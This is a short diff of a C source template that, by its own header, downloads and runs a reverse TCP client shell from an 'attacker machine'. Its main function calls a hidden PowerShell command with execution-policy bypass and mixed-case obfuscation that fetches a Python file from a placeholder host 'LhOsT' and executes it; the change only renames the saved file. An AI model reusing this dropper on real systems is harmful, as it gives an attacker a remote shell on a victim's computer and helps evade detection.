@@ -12,6 +12,6 @@ This template its used to download/exec (Client.py) from attacker machine (LAN)
 int main()
 {
  /* Here we use powershell to download/execute the reverse tcp Client shell */
- system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.py', 'TempDir\\FiLNaMe.py') && cd TempDir && python3 FiLNaMe.py");
+ system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.py', 'TempDir\\Client.py') && cd TempDir && python3 Client.py");
  return 0;
 }
